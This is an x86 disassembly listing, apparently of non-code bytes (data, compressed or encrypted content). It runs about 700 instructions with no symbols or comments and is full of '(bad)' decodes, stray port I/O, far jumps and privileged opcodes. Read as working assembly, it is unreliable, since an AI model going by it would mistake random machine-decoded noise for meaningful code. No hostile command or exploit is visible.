  41bda2:	jmp    0x737f3379
  41bda7:	fsubr  DWORD PTR ds:[edx]
  41bdaa:	mov    eax,ds:0xeb3d04b6
  41bdaf:	jne    0x41bda8
  41bdb1:	int3   
  41bdb2:	bound  edx,QWORD PTR [ecx-0x2e4c094a]
  41bdb8:	jo     0x41bdb3
  41bdba:	sbb    BYTE PTR [ebp+eiz*1+0x1d9890c9],cl
  41bdc1:	add    ch,BYTE PTR [edx]
  41bdc3:	(bad)  
  41bdc4:	mov    esi,0x6d0eee0c
  41bdc9:	rol    DWORD PTR [edx-0x6e],1
  41bdcc:	adc    BYTE PTR ds:0xfecfc5a3,al
  41bdd2:	push   0x20
  41bdd4:	mov    ecx,0xaaa18849
  41bdd9:	xchg   ebp,eax
  41bdda:	inc    ecx
  41bddb:	rol    DWORD PTR [edx+0x53ac81fb],1
  41bde1:	stos   DWORD PTR es:[edi],eax
  41bde2:	jne    0x41bdef
  41bde4:	data16 mov bh,0x9f
  41bde7:	xchg   ecx,eax
  41bde8:	mov    eax,ds:0x1a341403
  41bded:	das    
  41bdee:	mov    bh,0xd3
  41bdf0:	fisubr WORD PTR [esi+esi*8-0x486ea2d9]
  41bdf7:	inc    edi
  41bdf8:	fild   WORD PTR [eax-0x52]
  41bdfb:	sbb    eax,0x3970a886
  41be00:	and    eax,DWORD PTR [ebx+0x77]
  41be03:	sbb    al,0x4d
  41be05:	(bad)  [edx]
  41be07:	mov    dh,BYTE PTR [edx-0x1e2ff3b6]
  41be0d:	push   es
  41be0e:	xchg   esp,eax
  41be0f:	cdq    
  41be10:	test   DWORD PTR [ebx-0x61],edi
  41be13:	sbb    esi,DWORD PTR [ebp+0x4597a65f]
  41be19:	mov    fs,WORD PTR [edx+0x1483949c]
  41be1f:	je     0x41bdeb
  41be21:	lahf   
  41be22:	fwait
  41be23:	cli    
  41be24:	out    dx,eax
  41be25:	out    dx,eax
  41be26:	jae    0x41bdf1
  41be28:	and    bh,ah
  41be2a:	clc    
  41be2b:	adc    edi,DWORD PTR [edi]
  41be2d:	cs sbb eax,0x514140a7
  41be33:	cmp    al,0xe8
  41be35:	outs   dx,BYTE PTR fs:[esi]
  41be37:	sbb    BYTE PTR [eax],ch
  41be39:	sbb    DWORD PTR [edx],ecx
  41be3b:	jbe    0x41beb2
  41be3d:	repz out 0x6f,eax
  41be40:	mov    ebp,DWORD PTR [ecx-0x55105c66]
  41be46:	adc    al,dh
  41be48:	mov    eax,ds:0x74dc9cf7
  41be4d:	(bad)  
  41be4e:	xchg   DWORD PTR ds:0x29b47bf0,edx
  41be54:	jno    0x41be9d
  41be56:	cwde   
  41be57:	iret   
  41be58:	jp     0x41be9c
  41be5a:	mov    ch,0x1e
  41be5c:	jl     0x41bed6
  41be5e:	dec    ebp
  41be5f:	and    dl,ch
  41be61:	lods   al,BYTE PTR ds:[esi]
  41be62:	inc    esp
  41be63:	mov    ah,BYTE PTR [edi-0x54]
  41be66:	cmp    al,0xf1
  41be68:	sub    edi,eax
  41be6a:	jnp    0x41be3f
  41be6c:	mov    al,ds:0x166ea4f
  41be71:	dec    eax
  41be72:	lds    edx,FWORD PTR [edi]
  41be74:	rcr    DWORD PTR [ebp-0x15],1
  41be77:	lsl    ebx,WORD PTR [ebx+0x26]
  41be7b:	in     eax,0xbe
  41be7d:	sahf   
  41be7e:	jmp    0x6a16ecb6
  41be83:	mov    edi,es
  41be85:	retf   
  41be86:	arpl   WORD PTR [eax-0x3],si
  41be89:	add    ecx,edx
  41be8b:	adc    cl,BYTE PTR gs:[edx-0x2912b871]
  41be92:	dec    DWORD PTR [eax-0x1abf2681]
  41be98:	mov    cs,WORD PTR [edi+edi*8+0x3d]
  41be9c:	sub    ch,bl
  41be9e:	mov    dl,0x6d
  41bea0:	cmp    eax,0xe7b18591
  41bea5:	outs   dx,DWORD PTR ds:[esi]
  41bea6:	mov    ch,0xc1
  41bea8:	dec    ebx
  41bea9:	or     BYTE PTR [ebp-0x41750c11],dl
  41beaf:	pop    ss
  41beb0:	push   es
  41beb1:	push   edx
  41beb2:	jo     0x41bf26
  41beb4:	mov    ds:0xcaccc22f,al
  41beb9:	les    esp,FWORD PTR [ecx+0x65]
  41bebc:	iret   
  41bebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bebe:	sbb    al,0xb0
  41bec0:	and    DWORD PTR [ebp+eiz*1-0x7362ea19],eax
  41bec7:	cmp    ch,0xb5
  41beca:	enter  0xd755,0x57
  41bece:	sbb    edi,DWORD PTR [eax-0x28]
  41bed1:	inc    esi
  41bed2:	push   esi
  41bed3:	(bad)  
  41bed4:	call   0x3a33ebf
  41bed9:	mov    edi,0xc7ca5ece
  41bede:	mov    dl,dl
  41bee0:	inc    eax
  41bee1:	shl    cl,1
  41bee3:	sahf   
  41bee4:	sub    eax,ecx
  41bee6:	cmp    eax,0x68ea5156
  41beeb:	pushf  
  41beec:	ret    
  41beed:	and    DWORD PTR [edx],esp
  41beef:	jb     0x41bf66
  41bef1:	fisub  WORD PTR ss:[edx+0x62ce411e]
  41bef8:	xor    BYTE PTR [ebx],cl
  41befa:	jp     0x41bee0
  41befc:	in     al,dx
  41befd:	and    cl,ch
  41beff:	sub    ah,ah
  41bf01:	stc    
  41bf02:	jp     0x41becd
  41bf04:	or     DWORD PTR [ebp-0x3f1dfc76],eax
  41bf0a:	mov    DWORD PTR [ebx+edx*1+0x1150655c],esi
  41bf11:	rol    DWORD PTR [ebp+0x5cb036df],0xe8
  41bf18:	fdivr  QWORD PTR [eax-0x135ea09b]
  41bf1e:	mov    ds:0x7be82ef1,al
  41bf23:	aas    
  41bf24:	adc    DWORD PTR [ebp-0x25],esi
  41bf27:	inc    edi
  41bf28:	cmp    ebp,DWORD PTR [edi+0x6f]
  41bf2b:	push   eax
  41bf2c:	sub    cl,bh
  41bf2e:	loop   0x41bf8a
  41bf30:	xor    edi,ebp
  41bf32:	jo     0x41befe
  41bf34:	add    al,0x20
  41bf36:	ins    BYTE PTR es:[edi],dx
  41bf37:	fs adc eax,0x4b8b9d78
  41bf3d:	mov    ebx,DWORD PTR [esi+eax*4-0x30c52689]
  41bf44:	cwde   
  41bf45:	inc    ebp
  41bf46:	leave  
  41bf47:	add    DWORD PTR ds:0x53ef33d8,ecx
  41bf4d:	cmp    BYTE PTR [edi-0x15],ch
  41bf50:	jne    0x41befa
  41bf52:	out    0xfe,eax
  41bf54:	ins    BYTE PTR es:[edi],dx
  41bf55:	loop   0x41bf5c
  41bf57:	aad    0x48
  41bf59:	push   eax
  41bf5a:	(bad)  
  41bf5c:	scas   eax,DWORD PTR es:[edi]
  41bf5d:	pop    ss
  41bf5e:	xchg   esp,eax
  41bf5f:	fistp  QWORD PTR ds:0x3f5f8ddf
  41bf65:	daa    
  41bf66:	mov    ebx,?
  41bf68:	mov    ds:0x2852dad9,al
  41bf6d:	in     eax,0xe3
  41bf6f:	sub    cl,BYTE PTR [edx-0x21b5c792]
  41bf75:	shl    BYTE PTR [ecx+ebx*4],0x8c
  41bf79:	sub    ebp,esp
  41bf7b:	adc    DWORD PTR [edi+0x40e7bb62],0x4a116eed
  41bf85:	lahf   
  41bf86:	xlat   BYTE PTR ds:[ebx]
  41bf87:	nop
  41bf88:	retf   
  41bf89:	stos   DWORD PTR es:[edi],eax
  41bf8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf8b:	cmp    BYTE PTR [edi+0x2d],dh
  41bf8e:	jle    0x41bf4b
  41bf90:	mov    cl,0x1d
  41bf92:	mov    edx,0xd7ac93f7
  41bf97:	ins    BYTE PTR es:[edi],dx
  41bf98:	sub    edx,ebx
  41bf9a:	lods   al,BYTE PTR ds:[esi]
  41bf9b:	loop   0x41bff2
  41bf9d:	fwait
  41bf9e:	ins    BYTE PTR es:[edi],dx
  41bf9f:	mov    ebx,0xf547f75e
  41bfa4:	adc    ecx,DWORD PTR [ecx]
  41bfa6:	lock inc di
  41bfa9:	add    al,0x45
  41bfab:	std    
  41bfac:	pusha  
  41bfad:	out    dx,al
  41bfae:	pop    ss
  41bfaf:	enter  0xef9d,0xe0
  41bfb3:	je     0x41bf7a
  41bfb5:	and    al,BYTE PTR [edi]
  41bfb7:	mov    ah,al
  41bfb9:	pop    esp
  41bfba:	out    dx,eax
  41bfbb:	or     esi,DWORD PTR [ecx-0x63458f15]
  41bfc1:	ins    BYTE PTR es:[edi],dx
  41bfc2:	mov    esp,0x252b1d4c
  41bfc7:	and    DWORD PTR [ecx+0x4053c310],edx
  41bfcd:	repz imul ecx,DWORD PTR [ecx],0x69
  41bfd1:	jo     0x41bfe3
  41bfd3:	cs sti 
  41bfd5:	push   edx
  41bfd6:	pop    ebp
  41bfd7:	je     0x41bfbc
  41bfd9:	adc    dh,BYTE PTR [eax+eax*1+0x30c2bbf8]
  41bfe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfe1:	mov    al,ds:0xeb03effa
  41bfe6:	sub    ecx,DWORD PTR [esi+0x9]
  41bfe9:	or     al,0xbb
  41bfeb:	int    0x8e
  41bfed:	push   ebp
  41bfee:	imul   edx,DWORD PTR [ebx],0x58f42ffd
  41bff4:	mov    bh,0x41
  41bff6:	test   DWORD PTR [eax-0x57],ebp
  41bff9:	mov    edx,0xa9c76adb
  41bffe:	pop    ecx
  41bfff:	repnz test BYTE PTR [ebp+0x4f],cl
  41c003:	test   DWORD PTR ds:0x79b0ab3f,ecx
  41c009:	sub    eax,0x9c43ef2f
  41c00e:	xor    BYTE PTR [esp+eax*4],al
  41c011:	dec    esp
  41c012:	fsubr  DWORD PTR [ebp-0x1]
  41c015:	vmread DWORD PTR [ebp+eax*8-0x4d],esi
  41c01a:	add    DWORD PTR [eax+0x39],edi
  41c01d:	push   edi
  41c01e:	cmp    bl,BYTE PTR [ecx-0x6]
  41c021:	jns    0x41bfda
  41c023:	push   esi
  41c024:	js     0x41c04d
  41c026:	and    esi,DWORD PTR [ecx+0x2]
  41c029:	out    0x4d,eax
  41c02b:	inc    edi
  41c02c:	cli    
  41c02d:	aas    
  41c02e:	dec    edi
  41c02f:	or     BYTE PTR [ecx+edx*1+0x25],0xe4
  41c034:	pop    esi
  41c035:	loope  0x41c03f
  41c037:	sub    BYTE PTR [eax+0x55],al
  41c03a:	call   0x865:0xd6fdd37b
  41c041:	inc    ebp
  41c042:	jo     0x41c0a4
  41c044:	push   eax
  41c045:	das    
  41c046:	and    eax,DWORD PTR [edi]
  41c048:	dec    eax
  41c049:	mov    ah,0xdd
  41c04b:	jb     0x41c06c
  41c04d:	and    BYTE PTR [ecx+0x7a],bh
  41c050:	dec    ecx
  41c051:	dec    edi
  41c052:	pop    ecx
  41c053:	cli    
  41c054:	sar    ch,0x63
  41c057:	xchg   dl,dh
  41c059:	sbb    ebp,DWORD PTR ds:0xb28e7cbb
  41c05f:	add    DWORD PTR [ebx+esi*4],ebp
  41c062:	loope  0x41c072
  41c064:	jle    0x41c05b
  41c066:	jnp    0x41c006
  41c068:	aaa    
  41c069:	add    BYTE PTR [ecx],0x5c
  41c06c:	pop    edx
  41c06d:	stos   BYTE PTR es:[edi],al
  41c06e:	push   edi
  41c06f:	mov    ebp,0xcaed64d
  41c074:	mov    ch,0x78
  41c076:	cmp    eax,DWORD PTR [ebx-0x68db5f21]
  41c07c:	push   ds
  41c07d:	xchg   edi,eax
  41c07e:	dec    edi
  41c07f:	in     al,dx
  41c080:	mov    eax,0x6bfb2700
  41c085:	pop    ss
  41c086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c087:	mov    ebx,0x2afe9cf2
  41c08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c08d:	scas   al,BYTE PTR es:[edi]
  41c08e:	lds    edi,FWORD PTR [edx]
  41c090:	cmp    ebx,DWORD PTR [edx-0x122eac8e]
  41c096:	dec    ecx
  41c097:	xchg   edi,eax
  41c098:	out    0xa3,al
  41c09a:	loop   0x41c0de
  41c09c:	inc    esp
  41c09d:	jb     0x41c112
  41c09f:	imul   edi,DWORD PTR [edx],0x7b
  41c0a2:	mov    ds:0x12cbc363,al
  41c0a7:	add    bl,BYTE PTR ds:0x7c665fa6
  41c0ad:	dec    edx
  41c0ae:	push   0xfffffff0
  41c0b0:	sub    BYTE PTR [ecx],dl
  41c0b2:	leave  
  41c0b3:	adc    cl,BYTE PTR [ecx+0x6234d24b]
  41c0b9:	out    0x30,eax
  41c0bb:	xor    eax,0xf66ad293
  41c0c0:	jg     0x41c141
  41c0c2:	mov    eax,0x5a3b5ba6
  41c0c7:	dec    eax
  41c0c8:	cmp    eax,0xd4e28377
  41c0cd:	(bad)  
  41c0ce:	pop    ss
  41c0cf:	loopne 0x41c071
  41c0d1:	dec    ecx
  41c0d2:	retf   
  41c0d3:	jnp    0x41c10b
  41c0d5:	adc    al,0xc9
  41c0d7:	mov    esp,0x413330af
  41c0dc:	adc    eax,0xfdaf5e65
  41c0e1:	xchg   BYTE PTR [ecx],dh
  41c0e3:	add    BYTE PTR [ebx+0x77],ah
  41c0e6:	into   
  41c0e7:	(bad)  
  41c0e8:	xlat   BYTE PTR ds:[ebx]
  41c0e9:	rcr    DWORD PTR [ecx+0x22],cl
  41c0ec:	mov    ch,0x46
  41c0ee:	test   al,0xe0
  41c0f0:	loopne 0x41c092
  41c0f2:	mul    BYTE PTR [edi]
  41c0f4:	arpl   WORD PTR [eax+0x68],dx
  41c0f7:	fidivr DWORD PTR [ecx-0x62]
  41c0fa:	leave  
  41c0fb:	fsub   st,st(7)
  41c0fd:	mov    ebp,0xa95102ea
  41c102:	outs   dx,BYTE PTR ds:[esi]
  41c103:	int3   
  41c104:	or     DWORD PTR [ebp-0x51791f0a],esi
  41c10a:	pop    ds
  41c10b:	adc    al,0xc2
  41c10d:	and    edi,ecx
  41c10f:	je     0x41c148
  41c111:	retf   
  41c112:	jne    0x41c16f
  41c114:	push   esi
  41c115:	adc    dl,BYTE PTR fs:[ebp+eax*4-0x22ba0972]
  41c11d:	xor    eax,0x804a746b
  41c122:	dec    esp
  41c123:	pusha  
  41c124:	adc    eax,0xa067807c
  41c129:	dec    esi
  41c12a:	sti    
  41c12b:	xor    al,0x58
  41c12d:	or     DWORD PTR [esi-0x241db72d],ecx
  41c133:	pop    ds
  41c134:	test   al,0x3a
  41c136:	pusha  
  41c137:	ss addr16 push ds
  41c13a:	or     ecx,DWORD PTR [edi-0x5b]
  41c13d:	mov    ah,BYTE PTR [edx+0xd]
  41c140:	mov    al,ds:0x42ec7bf2
  41c145:	inc    ebp
  41c146:	and    al,0x7d
  41c148:	loop   0x41c191
  41c14a:	retf   0xc9d9
  41c14d:	pop    edi
  41c14e:	mov    DWORD PTR [edx+0x6c],esi
  41c151:	jmp    0x41c1d1
  41c153:	ss dec ebx
  41c155:	loop   0x41c104
  41c157:	xor    DWORD PTR [ecx+0x35e57e36],esi
  41c15d:	xor    BYTE PTR [ecx],dl
  41c15f:	push   ebp
  41c160:	pop    es
  41c161:	adc    cl,BYTE PTR [ecx-0x25]
  41c164:	pop    ecx
  41c165:	ins    DWORD PTR es:[edi],dx
  41c166:	push   edi
  41c167:	cmp    dh,BYTE PTR [ebx]
  41c169:	imul   edi,esi,0xb43333eb
  41c16f:	mov    eax,0x53df096f
  41c174:	adc    DWORD PTR [ebx],ebx
  41c176:	push   ds
  41c177:	adc    DWORD PTR [eax-0x51],ebp
  41c17a:	les    ebp,FWORD PTR [eax]
  41c17c:	inc    esp
  41c17d:	shl    esp,cl
  41c17f:	and    esp,DWORD PTR [edi+0x36]
  41c182:	mov    dh,0x49
  41c184:	scas   eax,DWORD PTR es:[edi]
  41c185:	mov    bh,0xc6
  41c187:	push   eax
  41c188:	shl    BYTE PTR [ebp+0x5e062d1a],cl
  41c18e:	xlat   BYTE PTR ds:[ebx]
  41c18f:	or     al,0x22
  41c191:	add    dl,BYTE PTR [edx-0x7d3018a9]
  41c197:	lock lock or al,0xf8
  41c19b:	fs call 0xdc9:0xedf2d38b
  41c1a3:	cdq    
  41c1a4:	sbb    DWORD PTR [edi-0x28],ebp
  41c1a7:	mov    esp,ebx
  41c1a9:	ja     0x41c1bf
  41c1ab:	cld    
  41c1ac:	mov    eax,ds:0x8b20e39d
  41c1b1:	scas   eax,DWORD PTR es:[edi]
  41c1b2:	bound  ebx,QWORD PTR [edx+0x6a705091]
  41c1b8:	add    ah,dl
  41c1ba:	jo     0x41c163
  41c1bc:	popa   
  41c1bd:	stc    
  41c1be:	daa    
  41c1bf:	xor    edi,esp
  41c1c1:	push   ds
  41c1c2:	popa   
  41c1c3:	xor    edx,ebx
  41c1c5:	(bad)  
  41c1c7:	or     ebx,ecx
  41c1c9:	mov    bh,0x20
  41c1cb:	popa   
  41c1cc:	aam    0x58
  41c1ce:	inc    esi
  41c1cf:	inc    ecx
  41c1d0:	adc    eax,DWORD PTR [edi+0x2b907b34]
  41c1d6:	and    al,0x1b
  41c1d8:	jno    0x41c207
  41c1da:	hlt    
  41c1db:	adc    dh,0x12
  41c1de:	in     eax,dx
  41c1df:	lahf   
  41c1e0:	addr16 into 
  41c1e2:	dec    edi
  41c1e3:	jmp    0xe726f18e
  41c1e8:	pushf  
  41c1e9:	ret    0x1074
  41c1ec:	jl     0x41c181
  41c1ee:	inc    esp
  41c1ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1f0:	mov    ebx,0x432f675b
  41c1f5:	push   ebp
  41c1f6:	out    0xbc,eax
  41c1f8:	or     BYTE PTR [eax],ch
  41c1fa:	pop    esi
  41c1fb:	adc    eax,0x597cf1d7
  41c200:	addr16 ja 0x41c189
  41c203:	add    ah,bl
  41c205:	sbb    al,0xe
  41c207:	xchg   ecx,eax
  41c208:	pop    ebx
  41c209:	adc    bl,BYTE PTR [ebx+ecx*1+0x1a446b10]
  41c210:	lods   eax,DWORD PTR ds:[esi]
  41c211:	aam    0xfa
  41c213:	dec    ebp
  41c214:	xchg   edx,eax
  41c215:	cmp    DWORD PTR [eax-0x3],0x183da3dc
  41c21c:	or     eax,0x2d611328
  41c221:	dec    edi
  41c222:	mov    ebx,eax
  41c224:	fistp  WORD PTR [ecx]
  41c226:	push   ds
  41c227:	dec    eax
  41c228:	(bad)  
  41c22b:	pusha  
  41c22c:	dec    esi
  41c22d:	inc    esp
  41c22e:	push   edi
  41c22f:	adc    edx,DWORD PTR ds:0xfd9ed2ee
  41c235:	aaa    
  41c236:	mov    cl,0xa8
  41c238:	add    ah,bh
  41c23a:	in     al,0xe
  41c23c:	push   ebp
  41c23d:	push   ebx
  41c23e:	pop    edx
  41c23f:	(bad)  
  41c241:	add    dl,BYTE PTR [eax-0x74]
  41c244:	and    eax,eax
  41c246:	xchg   esi,eax
  41c247:	das    
  41c248:	(bad)  
  41c249:	jmp    0x436a:0x6b129aa3
  41c250:	ret    
  41c251:	push   cs
  41c252:	mov    ecx,0x8836a593
  41c257:	call   0x655d5fe0
  41c25c:	jne    0x41c214
  41c25e:	xchg   ecx,eax
  41c25f:	stc    
  41c260:	int3   
  41c261:	aaa    
  41c262:	ss pop ss
  41c264:	cmp    al,0x5a
  41c266:	inc    eax
  41c267:	jp     0x41c2ad
  41c269:	xor    DWORD PTR [eax-0x6900ffa5],ebx
  41c26f:	sub    edi,edi
  41c271:	mov    al,ds:0x692900fd
  41c276:	or     ebp,DWORD PTR [esi-0x47]
  41c279:	push   esp
  41c27a:	and    ebx,edx
  41c27c:	jl     0x41c2f5
  41c27e:	das    
  41c27f:	lea    edx,ds:0xb42433ae
  41c285:	xchg   edi,eax
  41c286:	push   ebp
  41c287:	sub    DWORD PTR [ebx+0x7e],edx
  41c28a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c28b:	pop    edx
  41c28c:	cld    
  41c28d:	call   0x5ddfc5ad
  41c292:	cmp    ebp,DWORD PTR [esi+eiz*1-0x3d]
  41c296:	mov    esp,0xbc5331d3
  41c29b:	nop
  41c29c:	clc    
  41c29d:	xor    eax,0xfbb8fe1e
  41c2a2:	and    al,0x86
  41c2a4:	adc    ch,dl
  41c2a6:	lock (bad) 
  41c2a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2a9:	enter  0x1d4d,0x1c
  41c2ad:	lods   eax,DWORD PTR ds:[esi]
  41c2ae:	or     al,0xab
  41c2b0:	fucom  st(7)
  41c2b2:	mov    al,ds:0xc241b2e9
  41c2b7:	repnz mov al,ds:0xcd2e640b
  41c2bd:	sub    cl,BYTE PTR [ebp-0x5f]
  41c2c0:	pop    DWORD PTR [edx]
  41c2c2:	ss inc edx
  41c2c4:	sti    
  41c2c5:	sub    BYTE PTR [ebp+0x5a0ef00c],dh
  41c2cb:	xor    eax,0xb81bd180
  41c2d0:	jp     0x41c2d4
  41c2d2:	adc    ebx,DWORD PTR [ecx-0x3c513088]
  41c2d8:	or     DWORD PTR [ecx-0x1a],ecx
  41c2db:	xor    al,0xe7
  41c2dd:	mov    ax,0xe808
  41c2e1:	daa    
  41c2e2:	push   0x61
  41c2e4:	push   esp
  41c2e5:	(bad)  
  41c2e6:	rcl    dl,cl
  41c2e8:	and    al,0xc5
  41c2ea:	sbb    ebp,edx
  41c2ec:	lock arpl WORD PTR cs:0xbf18c720,di
  41c2f4:	pop    esp
  41c2f5:	push   esp
  41c2f6:	adc    ecx,DWORD PTR [ecx+edi*8]
  41c2f9:	xor    ebp,DWORD PTR [edx]
  41c2fb:	(bad)  
  41c2fc:	frstor [esi+ecx*2-0x25e42117]
  41c303:	or     dh,BYTE PTR [ecx-0x3b96dc6e]
  41c309:	inc    edi
  41c30a:	mov    ecx,0xbe59fb30
  41c30f:	dec    ebx
  41c310:	jno    0x41c305
  41c312:	jae    0x41c30a
  41c314:	out    0x1e,al
  41c316:	mov    dh,0xd9
  41c318:	std    
  41c319:	mov    ds:0x5e15ffe5,al
  41c31e:	jl     0x41c32e
  41c320:	test   DWORD PTR [ebx],esi
  41c322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c323:	xlat   BYTE PTR ds:[ebx]
  41c324:	ja     0x41c2bf
  41c326:	pop    edi
  41c327:	mov    dh,0x8e
  41c329:	aam    0x9b
  41c32b:	mov    eax,0x66a0d9fe
  41c330:	imul   esp,DWORD PTR [edi-0x3d],0xfffffffb
  41c334:	ror    BYTE PTR [ebx],1
  41c336:	fldenv [ecx]
  41c338:	bound  edx,QWORD PTR [esi]
  41c33a:	(bad)  
  41c33b:	sub    BYTE PTR [eax],cl
  41c33d:	test   DWORD PTR [ebx-0x3fb2091e],eax
  41c343:	and    eax,DWORD PTR [esi]
  41c345:	xchg   esi,edi
  41c347:	or     al,0xf6
  41c349:	pop    ss
  41c34a:	dec    ecx
  41c34b:	retf   0x591a
  41c34e:	loope  0x41c2d9
  41c350:	repz je 0x41c308
  41c353:	and    ebx,ecx
  41c355:	shl    ah,1
  41c357:	popa   
  41c358:	aad    0xa0
  41c35a:	scas   al,BYTE PTR es:[edi]
  41c35b:	popa   
  41c35c:	sub    eax,0x5a67a240
  41c361:	lock xchg esi,eax
  41c363:	rcl    ch,1
  41c365:	retf   0xfc68
  41c368:	in     al,dx
  41c369:	(bad)  
  41c36a:	pop    ss
  41c36b:	retf   0x9472
  41c36e:	push   0x7f
  41c370:	stos   BYTE PTR es:[edi],al
  41c371:	cmp    al,0x8c
  41c373:	mov    cl,0x94
  41c375:	add    ah,ch
  41c377:	loope  0x41c33f
  41c379:	shl    DWORD PTR [edx],cl
  41c37b:	or     edi,ebp
  41c37d:	gs addr16 push cs
  41c380:	test   DWORD PTR [eax-0x132cb06c],esi
  41c386:	jbe    0x41c32d
  41c388:	or     bh,bh
  41c38a:	dec    ecx
  41c38b:	jecxz  0x41c384
  41c38d:	sbb    DWORD PTR [edx],0xc0a81e04
  41c393:	out    dx,eax
  41c394:	scas   al,BYTE PTR es:[edi]
  41c395:	pushf  
  41c396:	mov    edi,0x76ac0b15
  41c39b:	in     al,0x9c
  41c39d:	pop    edi
  41c39e:	mov    eax,DWORD PTR [edi]
  41c3a0:	sbb    DWORD PTR [edi+ecx*4+0x34ae9f21],0x52b1c669
  41c3ab:	mov    ds:0xab188283,al
  41c3b0:	cmp    BYTE PTR [edi],bh
  41c3b2:	cmp    BYTE PTR [eax-0x510603be],0x20
  41c3b9:	adc    eax,0x48a9d49a
  41c3be:	sub    cl,BYTE PTR [ebp+0x62]
  41c3c1:	push   esp
  41c3c2:	scas   al,BYTE PTR es:[edi]
  41c3c3:	or     cl,BYTE PTR [esi+0x5d]
  41c3c6:	call   0x620a:0x1fec001b
  41c3cd:	pusha  
  41c3ce:	mov    ch,0x9f
  41c3d0:	mov    cl,0x22
  41c3d2:	inc    ebx
  41c3d3:	adc    esi,DWORD PTR [eax-0x187b2f3d]
  41c3d9:	cmp    BYTE PTR [ebx],0x3f
  41c3dc:	test   eax,0x216b4a8a
  41c3e1:	int3   
  41c3e2:	sbb    DWORD PTR [edi+0x79b99a8e],ebx
  41c3e8:	leave  
  41c3e9:	inc    edx
  41c3ea:	sbb    DWORD PTR [edi-0x40],esp
  41c3ed:	fcomp  st(4)
  41c3ef:	inc    ebx
  41c3f0:	rcl    DWORD PTR [esi+ebx*1-0x5d],0x1f
  41c3f5:	and    dl,0x19
  41c3f8:	sbb    edx,DWORD PTR [ebx+ecx*1+0x16]
  41c3fc:	add    al,0x5
  41c3fe:	cmc    
  41c3ff:	mov    DWORD PTR [eax-0x541db56a],ebx
  41c405:	push   0x74
  41c407:	jo     0x41c469
  41c409:	inc    ecx
  41c40a:	sub    al,0xbe
  41c40c:	jmp    0x41c46d
  41c40e:	addr16 mov esi,0x143d6b0c
  41c414:	mov    ebp,0xe2f68d65
  41c419:	cmp    dl,BYTE PTR [edx+0x1bf149e3]
  41c41f:	cdq    
  41c420:	outs   dx,DWORD PTR ds:[esi]
  41c421:	(bad)  
  41c422:	mov    ah,0xe6
  41c424:	loopne 0x41c469
  41c426:	mov    esi,0x70f3e4ae
  41c42b:	and    eax,0xc99ddf06
  41c430:	cld    
  41c431:	imul   bh
  41c433:	std    
  41c434:	push   es
  41c435:	push   ebp
  41c436:	xchg   edx,eax
  41c437:	sbb    BYTE PTR [esi],bh
  41c439:	(bad)  
  41c43a:	push   ds
  41c43b:	sub    ecx,DWORD PTR [eax+0x4a]
  41c43e:	pop    ds
  41c43f:	mov    ds:0x91b2af1e,al
  41c444:	int    0xa5
  41c446:	(bad)  
  41c447:	jae    0x41c438
  41c449:	xchg   esp,eax
  41c44a:	icebp  
  41c44b:	ficomp WORD PTR [esi-0x7a]
  41c44e:	mov    BYTE PTR [ecx-0x23b034d6],ch
  41c454:	jns    0x41c461
  41c456:	retf   0x1f72
  41c459:	push   esp
  41c45a:	enter  0x55a7,0xf6
  41c45e:	lods   eax,DWORD PTR fs:[esi]
  41c460:	mov    dl,0x86
  41c462:	int    0x81
  41c464:	aad    0x1e
  41c466:	cmp    esp,eax
  41c468:	xor    eax,0xed1ee65d
  41c46d:	lods   eax,DWORD PTR ds:[esi]
  41c46e:	xchg   esi,eax
  41c46f:	push   ecx
  41c470:	into   
  41c471:	push   ss
  41c472:	pushf  
  41c473:	inc    ebp
  41c474:	or     ebp,DWORD PTR [edi-0x2e32a367]
  41c47a:	pop    es
  41c47b:	pop    eax
  41c47c:	mov    bl,0xd1
  41c47e:	jmp    0x5560:0x9eac5a5a
  41c485:	mov    ah,0x98
  41c487:	out    dx,al
  41c488:	out    dx,eax
  41c489:	pop    eax
  41c48a:	inc    esi
  41c48b:	xchg   ecx,eax
  41c48c:	fucomi st,st(6)
  41c48e:	jl     0x41c4a1
  41c490:	jmp    0x22224b9c
  41c495:	rol    BYTE PTR [ebx],0x87
  41c498:	inc    ecx
  41c499:	aaa    
  41c49a:	dec    esi
  41c49b:	aad    0x2c
  41c49d:	clc    
  41c49e:	cwde   
  41c49f:	js     0x41c4f9
  41c4a1:	(bad)  
  41c4a3:	sbb    al,0xeb
  41c4a5:	push   ds
  41c4a6:	leave  
  41c4a7:	in     eax,0xac
  41c4a9:	adc    al,cl
  41c4ab:	push   ss
  41c4ac:	cmp    al,0xd2
  41c4ae:	sub    esi,DWORD PTR [ebx+0x325ae11c]
  41c4b4:	xor    ebx,DWORD PTR [ecx+0x4a]
  41c4b7:	push   eax
  41c4b8:	or     edi,DWORD PTR [esi-0x3b]
  41c4bb:	lea    eax,[ebx-0x14]
  41c4be:	ret    0x47fe
  41c4c1:	push   esi
  41c4c2:	rol    esp,1
  41c4c4:	cmc    
  41c4c5:	push   ss
  41c4c6:	test   BYTE PTR [ebx+0x7f],ch
  41c4c9:	test   BYTE PTR [ebp+0x63],cl
  41c4cc:	gs xchg esi,eax
  41c4ce:	jmp    0xb9fdf0ae
  41c4d3:	add    eax,0xac089122
  41c4d8:	push   esp
  41c4d9:	mov    dl,0x78
  41c4db:	jno    0x41c53d
  41c4dd:	mov    dl,0x4f
  41c4df:	cmp    ah,BYTE PTR [esi-0x14]
  41c4e2:	aaa    
  41c4e3:	push   eax
  41c4e4:	mov    bh,0x9d
  41c4e6:	pop    edi
  41c4e7:	cmp    BYTE PTR [esi],dl
  41c4e9:	mov    ?,ecx
  41c4eb:	icebp  
  41c4ec:	push   ss
  41c4ed:	stos   DWORD PTR es:[edi],eax
  41c4ee:	popa   
  41c4ef:	pop    eax
  41c4f0:	ret    0xa13f
  41c4f3:	mov    al,0x52
  41c4f5:	ss cs aad 0x8a
  41c4f9:	mov    ds:0x105fa4f9,al
  41c4fe:	ins    DWORD PTR es:[edi],dx
  41c4ff:	jbe    0x41c57d
  41c501:	sbb    cl,bl
  41c503:	loop   0x41c525
  41c505:	fisubr DWORD PTR [ecx]
  41c507:	mov    dl,0x85
